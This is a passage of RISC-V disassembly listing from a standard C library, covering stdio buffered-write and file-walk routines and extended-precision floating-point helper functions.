   1271c:	0027f713          	andi	a4,a5,2
   12720:	0e071863          	bnez	a4,12810 <__sfvwrite_r+0x134>
   12724:	8b85                	andi	a5,a5,1
   12726:	4a81                	li	s5,0
   12728:	16078463          	beqz	a5,12890 <__sfvwrite_r+0x1b4>
   1272c:	4501                	li	a0,0
   1272e:	4b81                	li	s7,0
   12730:	4b01                	li	s6,0
   12732:	240b0863          	beqz	s6,12982 <__sfvwrite_r+0x2a6>
   12736:	e919                	bnez	a0,1274c <__sfvwrite_r+0x70>
   12738:	865a                	mv	a2,s6
   1273a:	45a9                	li	a1,10
   1273c:	855e                	mv	a0,s7
   1273e:	148020ef          	jal	ra,14886 <memchr>
   12742:	24050763          	beqz	a0,12990 <__sfvwrite_r+0x2b4>
   12746:	0505                	addi	a0,a0,1
   12748:	41750abb          	subw	s5,a0,s7
   1274c:	8c56                	mv	s8,s5
   1274e:	015b7363          	bleu	s5,s6,12754 <__sfvwrite_r+0x78>
   12752:	8c5a                	mv	s8,s6
   12754:	6008                	ld	a0,0(s0)
   12756:	6c1c                	ld	a5,24(s0)
   12758:	5014                	lw	a3,32(s0)
   1275a:	22a7fe63          	bleu	a0,a5,12996 <__sfvwrite_r+0x2ba>
   1275e:	4444                	lw	s1,12(s0)
   12760:	9cb5                	addw	s1,s1,a3
   12762:	2384da63          	ble	s8,s1,12996 <__sfvwrite_r+0x2ba>
   12766:	85de                	mv	a1,s7
   12768:	8626                	mv	a2,s1
   1276a:	1f4020ef          	jal	ra,1495e <memmove>
   1276e:	601c                	ld	a5,0(s0)
   12770:	85a2                	mv	a1,s0
   12772:	854a                	mv	a0,s2
   12774:	97a6                	add	a5,a5,s1
   12776:	e01c                	sd	a5,0(s0)
   12778:	acbff0ef          	jal	ra,12242 <_fflush_r>
   1277c:	10051263          	bnez	a0,12880 <__sfvwrite_r+0x1a4>
   12780:	409a8abb          	subw	s5,s5,s1
   12784:	4505                	li	a0,1
   12786:	000a9763          	bnez	s5,12794 <__sfvwrite_r+0xb8>
   1278a:	85a2                	mv	a1,s0
   1278c:	854a                	mv	a0,s2
   1278e:	ab5ff0ef          	jal	ra,12242 <_fflush_r>
   12792:	e57d                	bnez	a0,12880 <__sfvwrite_r+0x1a4>
   12794:	010a3783          	ld	a5,16(s4)
   12798:	9ba6                	add	s7,s7,s1
   1279a:	409b0b33          	sub	s6,s6,s1
   1279e:	409784b3          	sub	s1,a5,s1
   127a2:	009a3823          	sd	s1,16(s4)
   127a6:	f4d1                	bnez	s1,12732 <__sfvwrite_r+0x56>
   127a8:	a099                	j	127ee <__sfvwrite_r+0x112>
   127aa:	85a2                	mv	a1,s0
   127ac:	854a                	mv	a0,s2
   127ae:	f46ff0ef          	jal	ra,11ef4 <__swsetup_r>
   127b2:	57fd                	li	a5,-1
   127b4:	d125                	beqz	a0,12714 <__sfvwrite_r+0x38>
   127b6:	a82d                	j	127f0 <__sfvwrite_r+0x114>
   127b8:	0009ba83          	ld	s5,0(s3)
   127bc:	0089b483          	ld	s1,8(s3)
   127c0:	09c1                	addi	s3,s3,16
   127c2:	d8fd                	beqz	s1,127b8 <__sfvwrite_r+0xdc>
   127c4:	86a6                	mv	a3,s1
   127c6:	009b7363          	bleu	s1,s6,127cc <__sfvwrite_r+0xf0>
   127ca:	86da                	mv	a3,s6
   127cc:	603c                	ld	a5,64(s0)
   127ce:	780c                	ld	a1,48(s0)
   127d0:	2681                	sext.w	a3,a3
   127d2:	8656                	mv	a2,s5
   127d4:	854a                	mv	a0,s2
   127d6:	9782                	jalr	a5
   127d8:	0aa05463          	blez	a0,12880 <__sfvwrite_r+0x1a4>
   127dc:	010a3783          	ld	a5,16(s4)
   127e0:	9aaa                	add	s5,s5,a0
   127e2:	8c89                	sub	s1,s1,a0
   127e4:	40a78533          	sub	a0,a5,a0
   127e8:	00aa3823          	sd	a0,16(s4)
   127ec:	f979                	bnez	a0,127c2 <__sfvwrite_r+0xe6>
   127ee:	4781                	li	a5,0
   127f0:	70e6                	ld	ra,120(sp)
   127f2:	7446                	ld	s0,112(sp)
   127f4:	74a6                	ld	s1,104(sp)
   127f6:	7906                	ld	s2,96(sp)
   127f8:	69e6                	ld	s3,88(sp)
   127fa:	6a46                	ld	s4,80(sp)
   127fc:	6aa6                	ld	s5,72(sp)
   127fe:	6b06                	ld	s6,64(sp)
   12800:	7be2                	ld	s7,56(sp)
   12802:	7c42                	ld	s8,48(sp)
   12804:	7ca2                	ld	s9,40(sp)
   12806:	7d02                	ld	s10,32(sp)
   12808:	6de2                	ld	s11,24(sp)
   1280a:	853e                	mv	a0,a5
   1280c:	6109                	addi	sp,sp,128
   1280e:	8082                	ret
   12810:	80000b37          	lui	s6,0x80000
   12814:	4a81                	li	s5,0
   12816:	4481                	li	s1,0
   12818:	c00b4b13          	xori	s6,s6,-1024
   1281c:	b75d                	j	127c2 <__sfvwrite_r+0xe6>
   1281e:	0009ba83          	ld	s5,0(s3)
   12822:	0089bd03          	ld	s10,8(s3)
   12826:	09c1                	addi	s3,s3,16
   12828:	4444                	lw	s1,12(s0)
   1282a:	87a6                	mv	a5,s1
   1282c:	fe0d09e3          	beqz	s10,1281e <__sfvwrite_r+0x142>
   12830:	01045703          	lhu	a4,16(s0)
   12834:	6008                	ld	a0,0(s0)
   12836:	20077693          	andi	a3,a4,512
   1283a:	0e068863          	beqz	a3,1292a <__sfvwrite_r+0x24e>
   1283e:	089d6963          	bltu	s10,s1,128d0 <__sfvwrite_r+0x1f4>
   12842:	48077693          	andi	a3,a4,1152
   12846:	c6c9                	beqz	a3,128d0 <__sfvwrite_r+0x1f4>
   12848:	5004                	lw	s1,32(s0)
   1284a:	6c0c                	ld	a1,24(s0)
   1284c:	029c04bb          	mulw	s1,s8,s1
   12850:	8d0d                	sub	a0,a0,a1
   12852:	00050d9b          	sext.w	s11,a0
   12856:	001d8793          	addi	a5,s11,1
   1285a:	97ea                	add	a5,a5,s10
   1285c:	0394c4bb          	divw	s1,s1,s9
   12860:	00f4f563          	bleu	a5,s1,1286a <__sfvwrite_r+0x18e>
   12864:	2505                	addiw	a0,a0,1
   12866:	01a504bb          	addw	s1,a0,s10
   1286a:	40077713          	andi	a4,a4,1024
   1286e:	cf49                	beqz	a4,12908 <__sfvwrite_r+0x22c>
   12870:	85a6                	mv	a1,s1
   12872:	854a                	mv	a0,s2
   12874:	2e5010ef          	jal	ra,14358 <_malloc_r>
   12878:	e515                	bnez	a0,128a4 <__sfvwrite_r+0x1c8>
   1287a:	47b1                	li	a5,12
   1287c:	00f92023          	sw	a5,0(s2)
   12880:	01045783          	lhu	a5,16(s0)
   12884:	0407e793          	ori	a5,a5,64
   12888:	00f41823          	sh	a5,16(s0)
   1288c:	57fd                	li	a5,-1
   1288e:	b78d                	j	127f0 <__sfvwrite_r+0x114>
   12890:	80000b37          	lui	s6,0x80000
   12894:	ffeb4b93          	xori	s7,s6,-2
   12898:	4d01                	li	s10,0
   1289a:	fffb4b13          	not	s6,s6
   1289e:	4c0d                	li	s8,3
   128a0:	4c89                	li	s9,2
   128a2:	b759                	j	12828 <__sfvwrite_r+0x14c>
   128a4:	6c0c                	ld	a1,24(s0)
   128a6:	866e                	mv	a2,s11
   128a8:	e42a                	sd	a0,8(sp)
   128aa:	7f7010ef          	jal	ra,148a0 <memcpy>
   128ae:	01045703          	lhu	a4,16(s0)
   128b2:	67a2                	ld	a5,8(sp)
   128b4:	b7f77713          	andi	a4,a4,-1153
   128b8:	08076713          	ori	a4,a4,128
   128bc:	00e41823          	sh	a4,16(s0)
   128c0:	ec1c                	sd	a5,24(s0)
   128c2:	d004                	sw	s1,32(s0)
   128c4:	97ee                	add	a5,a5,s11
   128c6:	41b484bb          	subw	s1,s1,s11
   128ca:	e01c                	sd	a5,0(s0)
   128cc:	c444                	sw	s1,12(s0)
   128ce:	87ea                	mv	a5,s10
   128d0:	84ea                	mv	s1,s10
   128d2:	00fd7363          	bleu	a5,s10,128d8 <__sfvwrite_r+0x1fc>
   128d6:	87ea                	mv	a5,s10
   128d8:	6008                	ld	a0,0(s0)
   128da:	863e                	mv	a2,a5
   128dc:	85d6                	mv	a1,s5
   128de:	e43e                	sd	a5,8(sp)
   128e0:	07e020ef          	jal	ra,1495e <memmove>
   128e4:	4458                	lw	a4,12(s0)
   128e6:	67a2                	ld	a5,8(sp)
   128e8:	9f1d                	subw	a4,a4,a5
   128ea:	c458                	sw	a4,12(s0)
   128ec:	6018                	ld	a4,0(s0)
   128ee:	97ba                	add	a5,a5,a4
   128f0:	e01c                	sd	a5,0(s0)
   128f2:	010a3783          	ld	a5,16(s4)
   128f6:	9aa6                	add	s5,s5,s1
   128f8:	409d0d33          	sub	s10,s10,s1
   128fc:	409784b3          	sub	s1,a5,s1
   12900:	009a3823          	sd	s1,16(s4)
   12904:	f095                	bnez	s1,12828 <__sfvwrite_r+0x14c>
   12906:	b5e5                	j	127ee <__sfvwrite_r+0x112>
   12908:	8626                	mv	a2,s1
   1290a:	854a                	mv	a0,s2
   1290c:	2ad020ef          	jal	ra,153b8 <_realloc_r>
   12910:	87aa                	mv	a5,a0
   12912:	f55d                	bnez	a0,128c0 <__sfvwrite_r+0x1e4>
   12914:	6c0c                	ld	a1,24(s0)
   12916:	854a                	mv	a0,s2
   12918:	c13ff0ef          	jal	ra,1252a <_free_r>
   1291c:	01045783          	lhu	a5,16(s0)
   12920:	f7f7f793          	andi	a5,a5,-129
   12924:	00f41823          	sh	a5,16(s0)
   12928:	bf89                	j	1287a <__sfvwrite_r+0x19e>
   1292a:	6c1c                	ld	a5,24(s0)
   1292c:	00a7e563          	bltu	a5,a0,12936 <__sfvwrite_r+0x25a>
   12930:	5014                	lw	a3,32(s0)
   12932:	02dd7763          	bleu	a3,s10,12960 <__sfvwrite_r+0x284>
   12936:	009d7363          	bleu	s1,s10,1293c <__sfvwrite_r+0x260>
   1293a:	84ea                	mv	s1,s10
   1293c:	8626                	mv	a2,s1
   1293e:	85d6                	mv	a1,s5
   12940:	01e020ef          	jal	ra,1495e <memmove>
   12944:	445c                	lw	a5,12(s0)
   12946:	4097873b          	subw	a4,a5,s1
   1294a:	601c                	ld	a5,0(s0)
   1294c:	c458                	sw	a4,12(s0)
   1294e:	97a6                	add	a5,a5,s1
   12950:	e01c                	sd	a5,0(s0)
   12952:	f345                	bnez	a4,128f2 <__sfvwrite_r+0x216>
   12954:	85a2                	mv	a1,s0
   12956:	854a                	mv	a0,s2
   12958:	8ebff0ef          	jal	ra,12242 <_fflush_r>
   1295c:	d959                	beqz	a0,128f2 <__sfvwrite_r+0x216>
   1295e:	b70d                	j	12880 <__sfvwrite_r+0x1a4>
   12960:	87da                	mv	a5,s6
   12962:	01abe363          	bltu	s7,s10,12968 <__sfvwrite_r+0x28c>
   12966:	87ea                	mv	a5,s10
   12968:	02d7c7bb          	divw	a5,a5,a3
   1296c:	6038                	ld	a4,64(s0)
   1296e:	780c                	ld	a1,48(s0)
   12970:	8656                	mv	a2,s5
   12972:	854a                	mv	a0,s2
   12974:	02d786bb          	mulw	a3,a5,a3
   12978:	9702                	jalr	a4
   1297a:	84aa                	mv	s1,a0
   1297c:	f6a04be3          	bgtz	a0,128f2 <__sfvwrite_r+0x216>
   12980:	b701                	j	12880 <__sfvwrite_r+0x1a4>
   12982:	0009bb83          	ld	s7,0(s3)
   12986:	0089bb03          	ld	s6,8(s3)
   1298a:	4501                	li	a0,0
   1298c:	09c1                	addi	s3,s3,16
   1298e:	b355                	j	12732 <__sfvwrite_r+0x56>
   12990:	001b0a9b          	addiw	s5,s6,1
   12994:	bb65                	j	1274c <__sfvwrite_r+0x70>
   12996:	00dc4b63          	blt	s8,a3,129ac <__sfvwrite_r+0x2d0>
   1299a:	603c                	ld	a5,64(s0)
   1299c:	780c                	ld	a1,48(s0)
   1299e:	865e                	mv	a2,s7
   129a0:	854a                	mv	a0,s2
   129a2:	9782                	jalr	a5
   129a4:	84aa                	mv	s1,a0
   129a6:	dca04de3          	bgtz	a0,12780 <__sfvwrite_r+0xa4>
   129aa:	bdd9                	j	12880 <__sfvwrite_r+0x1a4>
   129ac:	8662                	mv	a2,s8
   129ae:	85de                	mv	a1,s7
   129b0:	7af010ef          	jal	ra,1495e <memmove>
   129b4:	445c                	lw	a5,12(s0)
   129b6:	84e2                	mv	s1,s8
   129b8:	418787bb          	subw	a5,a5,s8
   129bc:	c45c                	sw	a5,12(s0)
   129be:	601c                	ld	a5,0(s0)
   129c0:	97e2                	add	a5,a5,s8
   129c2:	e01c                	sd	a5,0(s0)
   129c4:	bb75                	j	12780 <__sfvwrite_r+0xa4>

00000000000129c6 <_fwalk>:
   129c6:	715d                	addi	sp,sp,-80
   129c8:	e0a2                	sd	s0,64(sp)
   129ca:	fc26                	sd	s1,56(sp)
   129cc:	f052                	sd	s4,32(sp)
   129ce:	ec56                	sd	s5,24(sp)
   129d0:	e486                	sd	ra,72(sp)
   129d2:	f84a                	sd	s2,48(sp)
   129d4:	f44e                	sd	s3,40(sp)
   129d6:	52050493          	addi	s1,a0,1312
   129da:	4401                	li	s0,0
   129dc:	4a05                	li	s4,1
   129de:	5afd                	li	s5,-1
   129e0:	e899                	bnez	s1,129f6 <_fwalk+0x30>
   129e2:	8522                	mv	a0,s0
   129e4:	60a6                	ld	ra,72(sp)
   129e6:	6406                	ld	s0,64(sp)
   129e8:	74e2                	ld	s1,56(sp)
   129ea:	7942                	ld	s2,48(sp)
   129ec:	79a2                	ld	s3,40(sp)
   129ee:	7a02                	ld	s4,32(sp)
   129f0:	6ae2                	ld	s5,24(sp)
   129f2:	6161                	addi	sp,sp,80
   129f4:	8082                	ret
   129f6:	0104b903          	ld	s2,16(s1)
   129fa:	0084a983          	lw	s3,8(s1)
   129fe:	39fd                	addiw	s3,s3,-1
   12a00:	0009d463          	bgez	s3,12a08 <_fwalk+0x42>
   12a04:	6084                	ld	s1,0(s1)
   12a06:	bfe9                	j	129e0 <_fwalk+0x1a>
   12a08:	01095783          	lhu	a5,16(s2)
   12a0c:	00fa7c63          	bleu	a5,s4,12a24 <_fwalk+0x5e>
   12a10:	01291783          	lh	a5,18(s2)
   12a14:	01578863          	beq	a5,s5,12a24 <_fwalk+0x5e>
   12a18:	854a                	mv	a0,s2
   12a1a:	e42e                	sd	a1,8(sp)
   12a1c:	9582                	jalr	a1
   12a1e:	65a2                	ld	a1,8(sp)
   12a20:	8c49                	or	s0,s0,a0
   12a22:	2401                	sext.w	s0,s0
   12a24:	0b090913          	addi	s2,s2,176
   12a28:	bfd9                	j	129fe <_fwalk+0x38>

0000000000012a2a <_fwalk_reent>:
   12a2a:	715d                	addi	sp,sp,-80
   12a2c:	e0a2                	sd	s0,64(sp)
   12a2e:	fc26                	sd	s1,56(sp)
   12a30:	f052                	sd	s4,32(sp)
   12a32:	ec56                	sd	s5,24(sp)
   12a34:	e85a                	sd	s6,16(sp)
   12a36:	e45e                	sd	s7,8(sp)
   12a38:	e486                	sd	ra,72(sp)
   12a3a:	f84a                	sd	s2,48(sp)
   12a3c:	f44e                	sd	s3,40(sp)
   12a3e:	8a2a                	mv	s4,a0
   12a40:	8aae                	mv	s5,a1
   12a42:	52050493          	addi	s1,a0,1312
   12a46:	4401                	li	s0,0
   12a48:	4b05                	li	s6,1
   12a4a:	5bfd                	li	s7,-1
   12a4c:	ec89                	bnez	s1,12a66 <_fwalk_reent+0x3c>
   12a4e:	8522                	mv	a0,s0
   12a50:	60a6                	ld	ra,72(sp)
   12a52:	6406                	ld	s0,64(sp)
   12a54:	74e2                	ld	s1,56(sp)
   12a56:	7942                	ld	s2,48(sp)
   12a58:	79a2                	ld	s3,40(sp)
   12a5a:	7a02                	ld	s4,32(sp)
   12a5c:	6ae2                	ld	s5,24(sp)
   12a5e:	6b42                	ld	s6,16(sp)
   12a60:	6ba2                	ld	s7,8(sp)
   12a62:	6161                	addi	sp,sp,80
   12a64:	8082                	ret
   12a66:	0104b903          	ld	s2,16(s1)
   12a6a:	0084a983          	lw	s3,8(s1)
   12a6e:	39fd                	addiw	s3,s3,-1
   12a70:	0009d463          	bgez	s3,12a78 <_fwalk_reent+0x4e>
   12a74:	6084                	ld	s1,0(s1)
   12a76:	bfd9                	j	12a4c <_fwalk_reent+0x22>
   12a78:	01095783          	lhu	a5,16(s2)
   12a7c:	00fb7b63          	bleu	a5,s6,12a92 <_fwalk_reent+0x68>
   12a80:	01291783          	lh	a5,18(s2)
   12a84:	01778763          	beq	a5,s7,12a92 <_fwalk_reent+0x68>
   12a88:	85ca                	mv	a1,s2
   12a8a:	8552                	mv	a0,s4
   12a8c:	9a82                	jalr	s5
   12a8e:	8c49                	or	s0,s0,a0
   12a90:	2401                	sext.w	s0,s0
   12a92:	0b090913          	addi	s2,s2,176
   12a96:	bfe1                	j	12a6e <_fwalk_reent+0x44>

0000000000012a98 <eclear>:
   12a98:	01450793          	addi	a5,a0,20
   12a9c:	0509                	addi	a0,a0,2
   12a9e:	fe051f23          	sh	zero,-2(a0)
   12aa2:	fef51de3          	bne	a0,a5,12a9c <eclear+0x4>
   12aa6:	8082                	ret

0000000000012aa8 <emov>:
   12aa8:	01450793          	addi	a5,a0,20
   12aac:	0509                	addi	a0,a0,2
   12aae:	ffe55703          	lhu	a4,-2(a0)
   12ab2:	0589                	addi	a1,a1,2
   12ab4:	fee59f23          	sh	a4,-2(a1)
   12ab8:	fea79ae3          	bne	a5,a0,12aac <emov+0x4>
   12abc:	8082                	ret

0000000000012abe <ecleaz>:
   12abe:	01a50793          	addi	a5,a0,26
   12ac2:	0509                	addi	a0,a0,2
   12ac4:	fe051f23          	sh	zero,-2(a0)
   12ac8:	fef51de3          	bne	a0,a5,12ac2 <ecleaz+0x4>
   12acc:	8082                	ret

0000000000012ace <emovz>:
   12ace:	01850713          	addi	a4,a0,24
   12ad2:	87ae                	mv	a5,a1
   12ad4:	0509                	addi	a0,a0,2
   12ad6:	ffe55683          	lhu	a3,-2(a0)
   12ada:	0789                	addi	a5,a5,2
   12adc:	fed79f23          	sh	a3,-2(a5)
   12ae0:	fea71ae3          	bne	a4,a0,12ad4 <emovz+0x6>
   12ae4:	00059c23          	sh	zero,24(a1)
   12ae8:	8082                	ret

0000000000012aea <ecmpm>:
   12aea:	00450793          	addi	a5,a0,4
   12aee:	0591                	addi	a1,a1,4
   12af0:	0569                	addi	a0,a0,26
   12af2:	0789                	addi	a5,a5,2
   12af4:	0589                	addi	a1,a1,2
   12af6:	ffe7d683          	lhu	a3,-2(a5)
   12afa:	ffe5d703          	lhu	a4,-2(a1)
   12afe:	00e69663          	bne	a3,a4,12b0a <ecmpm+0x20>
   12b02:	fef518e3          	bne	a0,a5,12af2 <ecmpm+0x8>
   12b06:	4501                	li	a0,0
   12b08:	8082                	ret
   12b0a:	4505                	li	a0,1
   12b0c:	00d76363          	bltu	a4,a3,12b12 <ecmpm+0x28>
   12b10:	557d                	li	a0,-1
   12b12:	8082                	ret

0000000000012b14 <eshdn1>:
   12b14:	00450693          	addi	a3,a0,4
   12b18:	4781                	li	a5,0
   12b1a:	0569                	addi	a0,a0,26
   12b1c:	7661                	lui	a2,0xffff8
   12b1e:	0006d703          	lhu	a4,0(a3)
   12b22:	00177593          	andi	a1,a4,1
   12b26:	c199                	beqz	a1,12b2c <eshdn1+0x18>
   12b28:	0017e793          	ori	a5,a5,1
   12b2c:	0027f593          	andi	a1,a5,2
   12b30:	8305                	srli	a4,a4,0x1
   12b32:	e999                	bnez	a1,12b48 <eshdn1+0x34>
   12b34:	0017979b          	slliw	a5,a5,0x1
   12b38:	00e69023          	sh	a4,0(a3)
   12b3c:	17c2                	slli	a5,a5,0x30
   12b3e:	0689                	addi	a3,a3,2
   12b40:	93c1                	srli	a5,a5,0x30
   12b42:	fcd51ee3          	bne	a0,a3,12b1e <eshdn1+0xa>
   12b46:	8082                	ret
   12b48:	8f51                	or	a4,a4,a2
   12b4a:	b7ed                	j	12b34 <eshdn1+0x20>

0000000000012b4c <eshup1>:
   12b4c:	01650693          	addi	a3,a0,22
   12b50:	4701                	li	a4,0
   12b52:	0026d783          	lhu	a5,2(a3)
   12b56:	0107961b          	slliw	a2,a5,0x10
   12b5a:	4106561b          	sraiw	a2,a2,0x10
   12b5e:	00065463          	bgez	a2,12b66 <eshup1+0x1a>
   12b62:	00176713          	ori	a4,a4,1
   12b66:	0017979b          	slliw	a5,a5,0x1
   12b6a:	17c2                	slli	a5,a5,0x30
   12b6c:	00277613          	andi	a2,a4,2
   12b70:	93c1                	srli	a5,a5,0x30
   12b72:	ea19                	bnez	a2,12b88 <eshup1+0x3c>
   12b74:	0017171b          	slliw	a4,a4,0x1
   12b78:	00f69123          	sh	a5,2(a3)
   12b7c:	1742                	slli	a4,a4,0x30
   12b7e:	16f9                	addi	a3,a3,-2
   12b80:	9341                	srli	a4,a4,0x30
   12b82:	fcd518e3          	bne	a0,a3,12b52 <eshup1+0x6>
   12b86:	8082                	ret
   12b88:	0017e793          	ori	a5,a5,1
   12b8c:	b7e5                	j	12b74 <eshup1+0x28>

0000000000012b8e <eshdn8>:
   12b8e:	00450793          	addi	a5,a0,4
   12b92:	4701                	li	a4,0
   12b94:	0569                	addi	a0,a0,26
   12b96:	0007d683          	lhu	a3,0(a5)
   12b9a:	0789                	addi	a5,a5,2
   12b9c:	0086d61b          	srliw	a2,a3,0x8
   12ba0:	8f51                	or	a4,a4,a2
   12ba2:	fee79f23          	sh	a4,-2(a5)
   12ba6:	0086971b          	slliw	a4,a3,0x8
   12baa:	1742                	slli	a4,a4,0x30
   12bac:	9341                	srli	a4,a4,0x30
   12bae:	fef514e3          	bne	a0,a5,12b96 <eshdn8+0x8>
   12bb2:	8082                	ret

0000000000012bb4 <eshup8>:
   12bb4:	01650793          	addi	a5,a0,22
   12bb8:	4701                	li	a4,0
   12bba:	0027d683          	lhu	a3,2(a5)
   12bbe:	17f9                	addi	a5,a5,-2
   12bc0:	00869613          	slli	a2,a3,0x8
   12bc4:	8f51                	or	a4,a4,a2
   12bc6:	00e79223          	sh	a4,4(a5)
   12bca:	0086d713          	srli	a4,a3,0x8
   12bce:	fef516e3          	bne	a0,a5,12bba <eshup8+0x6>
   12bd2:	8082                	ret

0000000000012bd4 <eshup6>:
   12bd4:	00450793          	addi	a5,a0,4
   12bd8:	01850713          	addi	a4,a0,24
   12bdc:	0789                	addi	a5,a5,2
   12bde:	0007d683          	lhu	a3,0(a5)
   12be2:	fed79f23          	sh	a3,-2(a5)
   12be6:	fef71be3          	bne	a4,a5,12bdc <eshup6+0x8>
   12bea:	00051c23          	sh	zero,24(a0)
   12bee:	8082                	ret

0000000000012bf0 <eshdn6>:
   12bf0:	01850793          	addi	a5,a0,24
   12bf4:	01a50713          	addi	a4,a0,26
   12bf8:	00450693          	addi	a3,a0,4
   12bfc:	17f9                	addi	a5,a5,-2
   12bfe:	0007d603          	lhu	a2,0(a5)
   12c02:	1779                	addi	a4,a4,-2
   12c04:	00c71023          	sh	a2,0(a4) # 20400000 <_end+0x2033f4e0>
   12c08:	fef69ae3          	bne	a3,a5,12bfc <eshdn6+0xc>
   12c0c:	00051223          	sh	zero,4(a0)
   12c10:	8082                	ret

0000000000012c12 <eaddm>:
   12c12:	05e1                	addi	a1,a1,24
   12c14:	01650713          	addi	a4,a0,22
   12c18:	4681                	li	a3,0
   12c1a:	0005d783          	lhu	a5,0(a1)
   12c1e:	1779                	addi	a4,a4,-2
   12c20:	15f9                	addi	a1,a1,-2
   12c22:	97b6                	add	a5,a5,a3
   12c24:	00475683          	lhu	a3,4(a4)
   12c28:	97b6                	add	a5,a5,a3
   12c2a:	00f59123          	sh	a5,2(a1)
   12c2e:	83c1                	srli	a5,a5,0x10
   12c30:	0017f693          	andi	a3,a5,1
   12c34:	fee513e3          	bne	a0,a4,12c1a <eaddm+0x8>
   12c38:	8082                	ret

0000000000012c3a <esubm>:
   12c3a:	05e1                	addi	a1,a1,24
   12c3c:	01650713          	addi	a4,a0,22
   12c40:	4681                	li	a3,0
   12c42:	0005d783          	lhu	a5,0(a1)
   12c46:	00275603          	lhu	a2,2(a4)
   12c4a:	1779                	addi	a4,a4,-2
   12c4c:	15f9                	addi	a1,a1,-2
   12c4e:	8f91                	sub	a5,a5,a2
   12c50:	8f95                	sub	a5,a5,a3
   12c52:	00f59123          	sh	a5,2(a1)
   12c56:	83c1                	srli	a5,a5,0x10
   12c58:	0017f693          	andi	a3,a5,1
   12c5c:	fee513e3          	bne	a0,a4,12c42 <esubm+0x8>
   12c60:	8082                	ret

0000000000012c62 <m16m>:
   12c62:	1101                	addi	sp,sp,-32
   12c64:	6341                	lui	t1,0x10
   12c66:	01858893          	addi	a7,a1,24
   12c6a:	00011b23          	sh	zero,22(sp)
   12c6e:	00011c23          	sh	zero,24(sp)
   12c72:	0591                	addi	a1,a1,4
   12c74:	0834                	addi	a3,sp,24
   12c76:	137d                	addi	t1,t1,-1
   12c78:	0008d703          	lhu	a4,0(a7)
   12c7c:	16f9                	addi	a3,a3,-2
   12c7e:	18f9                	addi	a7,a7,-2
   12c80:	e705                	bnez	a4,12ca8 <m16m+0x46>
   12c82:	fe069f23          	sh	zero,-2(a3)
   12c86:	ff1599e3          	bne	a1,a7,12c78 <m16m+0x16>
   12c8a:	4791                	li	a5,4
   12c8c:	4769                	li	a4,26
   12c8e:	00f105b3          	add	a1,sp,a5
   12c92:	0005d583          	lhu	a1,0(a1)
   12c96:	00f606b3          	add	a3,a2,a5
   12c9a:	0789                	addi	a5,a5,2
   12c9c:	00b69023          	sh	a1,0(a3)
   12ca0:	fee797e3          	bne	a5,a4,12c8e <m16m+0x2c>
   12ca4:	6105                	addi	sp,sp,32
   12ca6:	8082                	ret
   12ca8:	02a70733          	mul	a4,a4,a0
   12cac:	0026d803          	lhu	a6,2(a3)
   12cb0:	006777b3          	and	a5,a4,t1
   12cb4:	97c2                	add	a5,a5,a6
   12cb6:	0107d813          	srli	a6,a5,0x10
   12cba:	00f69123          	sh	a5,2(a3)
   12cbe:	01075793          	srli	a5,a4,0x10
   12cc2:	0006d703          	lhu	a4,0(a3)
   12cc6:	97ba                	add	a5,a5,a4
   12cc8:	97c2                	add	a5,a5,a6
   12cca:	00f69023          	sh	a5,0(a3)
   12cce:	83c1                	srli	a5,a5,0x10
   12cd0:	fef69f23          	sh	a5,-2(a3)
   12cd4:	bf4d                	j	12c86 <m16m+0x24>

0000000000012cd6 <eisnan>:
   12cd6:	01255783          	lhu	a5,18(a0)
   12cda:	fff7c793          	not	a5,a5
   12cde:	03179713          	slli	a4,a5,0x31
   12ce2:	eb09                	bnez	a4,12cf4 <eisnan+0x1e>
   12ce4:	01250793          	addi	a5,a0,18
   12ce8:	0509                	addi	a0,a0,2
   12cea:	ffe55703          	lhu	a4,-2(a0)
   12cee:	e709                	bnez	a4,12cf8 <eisnan+0x22>
   12cf0:	fea79ce3          	bne	a5,a0,12ce8 <eisnan+0x12>
   12cf4:	4501                	li	a0,0
   12cf6:	8082                	ret
   12cf8:	4505                	li	a0,1
   12cfa:	8082                	ret

0000000000012cfc <eisneg>:
   12cfc:	1141                	addi	sp,sp,-16
   12cfe:	e022                	sd	s0,0(sp)
   12d00:	e406                	sd	ra,8(sp)
   12d02:	842a                	mv	s0,a0
   12d04:	fd3ff0ef          	jal	ra,12cd6 <eisnan>
   12d08:	e901                	bnez	a0,12d18 <eisneg+0x1c>
   12d0a:	01344503          	lbu	a0,19(s0)
   12d0e:	811d                	srli	a0,a0,0x7
   12d10:	60a2                	ld	ra,8(sp)
   12d12:	6402                	ld	s0,0(sp)
   12d14:	0141                	addi	sp,sp,16
   12d16:	8082                	ret
   12d18:	4501                	li	a0,0
   12d1a:	bfdd                	j	12d10 <eisneg+0x14>

0000000000012d1c <emovi>:
   12d1c:	01251783          	lh	a5,18(a0)
   12d20:	1101                	addi	sp,sp,-32
   12d22:	ec06                	sd	ra,24(sp)
   12d24:	e822                	sd	s0,16(sp)
   12d26:	e426                	sd	s1,8(sp)
   12d28:	e04a                	sd	s2,0(sp)
   12d2a:	0407d963          	bgez	a5,12d7c <emovi+0x60>
   12d2e:	57fd                	li	a5,-1
   12d30:	00f59023          	sh	a5,0(a1)
   12d34:	01255703          	lhu	a4,18(a0)
   12d38:	67a1                	lui	a5,0x8
   12d3a:	17fd                	addi	a5,a5,-1
   12d3c:	8f7d                	and	a4,a4,a5
   12d3e:	00e59123          	sh	a4,2(a1)
   12d42:	01050913          	addi	s2,a0,16
   12d46:	04f71863          	bne	a4,a5,12d96 <emovi+0x7a>
   12d4a:	842e                	mv	s0,a1
   12d4c:	84aa                	mv	s1,a0
   12d4e:	f89ff0ef          	jal	ra,12cd6 <eisnan>
   12d52:	c905                	beqz	a0,12d82 <emovi+0x66>
   12d54:	00640793          	addi	a5,s0,6
   12d58:	00041223          	sh	zero,4(s0)
   12d5c:	ffc48513          	addi	a0,s1,-4
   12d60:	1979                	addi	s2,s2,-2
   12d62:	00295703          	lhu	a4,2(s2)
   12d66:	0789                	addi	a5,a5,2
   12d68:	fee79f23          	sh	a4,-2(a5) # 7ffe <_start-0x80b2>
   12d6c:	fea91ae3          	bne	s2,a0,12d60 <emovi+0x44>
   12d70:	60e2                	ld	ra,24(sp)
   12d72:	6442                	ld	s0,16(sp)
   12d74:	64a2                	ld	s1,8(sp)
   12d76:	6902                	ld	s2,0(sp)
   12d78:	6105                	addi	sp,sp,32
   12d7a:	8082                	ret
   12d7c:	00059023          	sh	zero,0(a1)
   12d80:	bf55                	j	12d34 <emovi+0x18>
   12d82:	00440793          	addi	a5,s0,4
   12d86:	01a40593          	addi	a1,s0,26
   12d8a:	0789                	addi	a5,a5,2
   12d8c:	fe079f23          	sh	zero,-2(a5)
